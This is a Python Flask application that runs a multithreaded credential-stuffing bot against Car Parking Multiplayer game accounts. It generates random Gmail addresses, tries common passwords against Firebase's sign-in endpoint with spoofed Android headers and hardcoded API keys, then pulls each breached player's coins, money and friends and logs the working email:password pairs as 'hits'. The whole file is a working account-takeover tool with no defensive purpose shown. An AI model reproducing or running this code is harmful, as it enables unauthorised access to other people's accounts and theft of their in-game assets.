from flask import Flask, render_template, jsonify, request, send_file
import requests
import json
import random
import time
import datetime
import threading
from concurrent.futures import ThreadPoolExecutor
import names
import os

app = Flask(__name__)

# Global değişkenler
running = False
stats = {'hit_count': 0, 'bad_count': 0, 'good_count': 0}
lock = threading.Lock()
executor = None
hits_file = None

headers = {
    "X-Client-Version": "js-5.0.0",
    "X-Firebase-GMPID": "727203278:android:af6b7dee042c8df539459f",
    "X-Firebase-Client": "H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; A5010 Build/PI)",
    "Host": "www.googleapis.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
}

def decode_nested_json(d):
    for key, value in d.items():
        if isinstance(value, str):
            try:
                nested_value = json.loads(value)
                d[key] = decode_nested_json(nested_value)
            except json.JSONDecodeError:
                continue
        elif isinstance(value, dict):
            d[key] = decode_nested_json(value)
    return d

def save_hit(email, password, player_data):
    global hits_file
    with open(hits_file, "a", encoding="utf-8") as f:
        f.write(f"""
🚘 CPM HIT → {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
📧 EMAIL: {email}:{password}
👤 NAME: {player_data.get('Name', 'None')}
🪙 COINS: {player_data.get('coin', 'None')}
💰 MONEY: {player_data.get('money', 'None')}
👥 FRIENDS: {len(player_data.get('FriendsID', []))}
{'-'*50}\n""")

def carparking_login_and_info(email, password):
    global stats
    try:
        data = {
            "email": email,
            "password": password,
            "returnSecureToken": True,
            "clientType": "CLIENT_TYPE_ANDROID"
        }
        res = requests.post(
            "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
            json=data,
            headers=headers,
            timeout=8
        ).json()

        if "idToken" in res:
            tkn = res["idToken"]
            data2 = {"idToken": tkn}
            res2 = requests.post(
                "https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
                json=data2,
                headers=headers,
                timeout=8
            ).json()

            data3 = {"data": "2893216D41959108CB8FA08951CB319B7AD80D02"}
            he = {
                "authorization": f"Bearer {tkn}",
                "firebase-instance-id-token": "f0Rstd-MTbydQx9M2eLlTM:APA91bF7UdxnXLAaybpBODKCRnyLu44eFWygoIfnLn7kOE9aujlb5WcvTv-EyA5mTNbVBPQ-r-x967XJqEA3TX23gGyXCSbMEEa2PIccvNU98uEcdun1qMgYbCOY4hPBBD2w6G9mfX_m",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.12.13"
            }
            info = requests.post(
                "https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2",
                json=data3,
                headers=he,
                timeout=8
            ).text

            data_account = json.loads(info)
            if 'result' in data_account:
                data_account['result'] = decode_nested_json(json.loads(data_account['result']))
                result_account = data_account["result"]

                player_data = {
                    'Name': result_account.get('Name', 'None'),
                    'coin': result_account.get('coin', 'None'),
                    'money': result_account.get('money', 'None'),
                    'FriendsID': result_account.get('FriendsID', [])
                }

                save_hit(email, password, player_data)
                with lock:
                    stats['hit_count'] += 1
                return True
        return False
    except:
        return False

def carparking_check(email):
    password_list = [
        "123456", "123456789", "12345678", "1234567", "123123",
        "111111", "123321", "654321", "000000", "password",
        "qwerty", "abc123", "Password123"
    ]
    for password in password_list:
        if carparking_login_and_info(email, password):
            return True
    return False

def worker():
    global stats
    while running:
        try:
            email_prefix = f"{names.get_first_name()}{''.join(random.choices('1234567890', k=random.randint(1,3)))}"
            email = f"{email_prefix}@gmail.com"
            
            if carparking_check(email):
                with lock:
                    stats['good_count'] += 1
            else:
                with lock:
                    stats['bad_count'] += 1
                    
            time.sleep(0.5)
        except:
            time.sleep(1)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bot():
    global running, executor, hits_file, stats
    if not running:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M")
        hits_file = f"cpm_hits_{timestamp}.txt"
        stats = {'hit_count': 0, 'bad_count': 0, 'good_count': 0}
        running = True
        executor = ThreadPoolExecutor(max_workers=20)
        for _ in range(20):
            executor.submit(worker)
        return jsonify({'status': 'started'})
    return jsonify({'status': 'already_running'})

@app.route('/stats')
def get_stats():
    with lock:
        return jsonify(stats)

@app.route('/stop', methods=['POST'])
def stop_bot():
    global running
    running = False
    if executor:
        executor.shutdown(wait=True)
    return jsonify({'status': 'stopped'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
